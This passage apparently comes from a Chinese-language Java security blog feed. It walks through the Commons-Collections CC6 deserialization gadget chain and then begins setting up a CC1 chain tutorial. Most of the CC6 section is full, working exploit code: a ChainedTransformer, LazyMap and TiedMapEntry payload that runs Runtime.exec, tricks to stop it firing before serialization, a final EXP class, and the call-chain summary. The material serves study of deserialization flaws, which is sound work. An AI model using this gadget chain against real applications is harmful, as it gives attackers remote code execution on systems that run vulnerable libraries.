<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 第二步：调用getRuntime方法获取Runtime实例</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 第三步：在Runtime实例上调用exec方法执行计算器</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// 将三个Transformer组合成链式转换器</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-comment">//生成LazyMap实例</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//新建TiedMapEntry实例</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-number">1</span>);<br>        tiedMapEntry.getValue();<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(tiedMapEntry,<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里在 <code>HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;();</code> 这里打断点，会发现直接 <code>tiedMapEntry.getValue();</code>就弹计算器了，不要着急，这里是一个 IDEA 的小坑</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><h4 id="问题一：-IDEA-的小坑"><a href="#问题一：-IDEA-的小坑" class="headerlink" title="问题一： IDEA 的小坑"></a>问题一： IDEA 的小坑</h4><p>我们在<code>TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;zac&quot;);</code>打断点可以看到，在走入构造方法时，就会弹出计算器了</p><p><img src="/img/CC6/c03.png"></p><h5 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h5><p>这是因为在 IDEA 进行 debug 调试的时候，为了展示对象的集合，会自动调用 <code>toString()</code> 方法，所以在创建 <code>TiedMapEntry</code> 的时候，就自动调用了 <code>getValue()</code> 最终将链子走完，然后弹出计算器。</p><p><img src="/img/CC6/c04.png"></p><h5 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h5><p>在 IDEA 的偏好设置当中如图修改即可</p><p><img src="/img/CC6/c05.png"></p><h4 id="问题二：序列化的时候，就能够弹出计算器"><a href="#问题二：序列化的时候，就能够弹出计算器" class="headerlink" title="问题二：序列化的时候，就能够弹出计算器"></a>问题二：序列化的时候，就能够弹出计算器</h4><p>原因：在执行put方法时，就会调用hash方法-&gt;hashCode，走原本链子的流程最后弹出计算器</p><p>这样的话，我们就少了此链的入口点，readObject方法，这条链不完整</p><p>与 URLDNS 中的不同，有些链子可以通过设置参数修改，有些则不行。在我们 CC6 的链子当中，通过修改这一句语句 <code>Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</code>，可以达到我们需要的效果。</p><p>我们之前传进去的参数是 <code>chainedTransformer</code>，我们在序列化的时候传进去一个没用的东西，再在反序列化的时候通过反射，将其修改回 <code>chainedTransformer</code>。相关的属性值在 LazyMap 当中为 <code>factory</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;<br>        <span class="hljs-comment">//危险参数构造</span><br>        <span class="hljs-comment">//危险方法，核心危险参数构造</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//触发攻击链子</span><br>                <span class="hljs-comment">//其实这里可以不用这个，因为我们不再需要进入setValue方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// 第一步：通过反射获取Runtime类的getRuntime方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 第二步：调用getRuntime方法获取Runtime实例</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 第三步：在Runtime实例上调用exec方法执行计算器</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// 将三个Transformer组合成链式转换器</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-comment">//生成LazyMap实例</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//先传入一个没有用的transformer</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">//新建TiedMapEntry实例</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;zac&quot;</span>);<br>        tiedMapEntry.getValue();<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;sds&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改lazyMap的参数factory的值</span><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-literal">true</span>);<br>        factory.set(lazyMap,chainedTransformer);<br><br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再次执行这个EXP发现，走到get方法后，并没有走入循环</p><p><img src="/img/CC6/c06.png"></p><p>注意，问题还是LazyMap的get方法</p><p>序列化前的操作：如果map没包含这个key，那么就给map传入这个键值对。</p><p>这样就会导致反序列化时map里已经存在这个key了，所以不会执行<code>factory.transform(key)</code>，从而导致无法命令执行。</p><p>所以，我们需要在hashMap.put之后，把lazymap的ley删除掉</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">lazymap.remove(<span class="hljs-string">&quot;2&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;<br>        <span class="hljs-comment">//危险参数构造</span><br>        <span class="hljs-comment">//危险方法，核心危险参数构造</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//触发攻击链子</span><br>                <span class="hljs-comment">//其实这里可以不用这个，因为我们不再需要进入setValue方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// 第一步：通过反射获取Runtime类的getRuntime方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 第二步：调用getRuntime方法获取Runtime实例</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 第三步：在Runtime实例上调用exec方法执行计算器</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// 将三个Transformer组合成链式转换器</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-comment">//生成LazyMap实例</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//先传入一个没有用的transformer</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">//新建TiedMapEntry实例</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        tiedMapEntry.getValue();<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改lazyMap的参数factory的值</span><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-literal">true</span>);<br>        factory.set(lazyMap,chainedTransformer);<br><br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">xxx.readObject()<br>HashMap.put()<br>HashMap.<span class="hljs-built_in">hash</span>()<br>TiedMapEntry.hashCode()<br>TiedMapEntry.getValue()<br>LazyMap.get()<br>ChainedTransformer.transform()<br>InvokerTransformer.transform()<br>Runtime.<span class="hljs-built_in">exec</span>()<br></code></pre></td></tr></table></figure><p><img src="/img/CC6/c07.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全-CC1链</title>
    <link href="/2025/09/03/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BE/"/>
    <url>/2025/09/03/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Java安全-CC1链"><a href="#Java安全-CC1链" class="headerlink" title="Java安全-CC1链"></a>Java安全-CC1链</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">JDK8u65</a></li><li>Maven 4.0.0</li></ul><p>创建一个 IDEA 项目，选中 maven，并使用 jdk8u65</p><p>maven项目模板选择quickstart</p><p><img src="/img/CC1/c01.png"></p><p>在项目结构-&gt;模块修改语言级别</p><p><img src="/img/CC1/c02.png"></p><p>添加 Maven 中对 CC1 链的依赖包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用 <code>maven clean + maven install</code></p><ul><li>再说一说如何验证环境导入成功吧，我们 import CC 的包</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br></code></pre></td></tr></table></figure><p>如果成功说明安装成功了 ~</p><p>我们还要做一件事，修改 sun 包</p><p>因为我们打开源码，很多地方的文件是 .class 文件，是已经编译完了的文件，都是反编译代码，我们很难读懂，所以需要把它转换为 .java 文件</p><p> <a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">openJDK 8u65</a> ———— 去到这个下载链接，点击 zip</p><p><img src="/img/CC1/c03.png"></p><p>将其解压之后，先搁一边，我们解压 jdk8u65 的 src.zip，解压完之后，我们把 openJDK 8u65 解压出来的 sun 文件夹拷贝进 jdk8u65 中，这样子就能把 .class 文件转换为 .java 文件了。</p><p> openJDK 8u65 sun文件夹在jdk-af660750b2f4\src\share\classes路径下</p><p>拷贝成功后，在IDEA-&gt;File-&gt;项目结构-&gt;SDK-&gt;源路径中加入src文件夹</p><p><img src="/img/CC1/c05.png"></p><h2 id="Common-Collections-相关介绍"><a href="#Common-Collections-相关介绍" class="headerlink" title="Common-Collections 相关介绍"></a>Common-Collections 相关介绍</h2><p>出自：<a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons Collections包和简介 | 闪烁之狐</a></p><p><a href="http://commons.apache.org/">Apache Commons</a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）。</p><ul><li>简单来说，Common-Collections 这个项目开发出来是为了给 Java 标准的 <code>Collections API</code> 提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。</li></ul><h3 id="包结构介绍"><a href="#包结构介绍" class="headerlink" title="包结构介绍"></a>包结构介绍</h3><ul><li><code>org.apache.commons.collections</code> – CommonsCollections自定义的一组公用的接口和工具类</li><li><code>org.apache.commons.collections.bag</code> – 实现Bag接口的一组类</li><li><code>org.apache.commons.collections.bidimap</code> – 实现BidiMap系列接口的一组类</li><li><code>org.apache.commons.collections.buffer</code> – 实现Buffer接口的一组类</li><li><code>org.apache.commons.collections.collection</code> –实现java.util.Collection接口的一组类</li><li><code>org.apache.commons.collections.comparators</code>– 实现java.util.Comparator接口的一组类</li><li><code>org.apache.commons.collections.functors</code> –Commons Collections自定义的一组功能类</li><li><code>org.apache.commons.collections.iterators</code> – 实现java.util.Iterator接口的一组类</li><li><code>org.apache.commons.collections.keyvalue</code> – 实现集合和键&#x2F;值映射相关的一组类</li><li><code>org.apache.commons.collections.list</code> – 实现java.util.List接口的一组类</li><li><code>org.apache.commons.collections.map</code> – 实现Map系列接口的一组类</li><li><code>org.apache.commons.collections.set</code> – 实现Set系列接口的一组类</li></ul><h2 id="TransformMap版CC1攻击链分析"><a href="#TransformMap版CC1攻击链分析" class="headerlink" title="TransformMap版CC1攻击链分析"></a>TransformMap版CC1攻击链分析</h2><ul><li>首先我们再次明确一下反序列化的攻击思路。</li></ul><p>入口类这里，我们需要一个 <code>readObject</code> 